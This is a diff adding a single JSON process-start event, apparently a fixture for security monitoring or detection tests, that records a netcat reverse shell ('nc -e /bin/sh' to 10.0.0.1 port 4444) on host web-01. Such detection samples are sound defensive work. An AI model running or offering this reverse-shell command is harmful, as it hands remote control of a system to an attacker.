@@ -1,0 +1,13 @@
+{
+  "source": "process",
+  "occurred_at": "2026-06-17T12:00:01Z",
+  "host": "web-01",
+  "action": "process_started",
+  "severity": 3,
+  "pid": 4242,
+  "ppid": 1000,
+  "starttime": 998877,
+  "comm": "nc",
+  "cmdline": "nc -e /bin/sh 10.0.0.1 4444",
+  "executable": "/usr/bin/nc"
+}
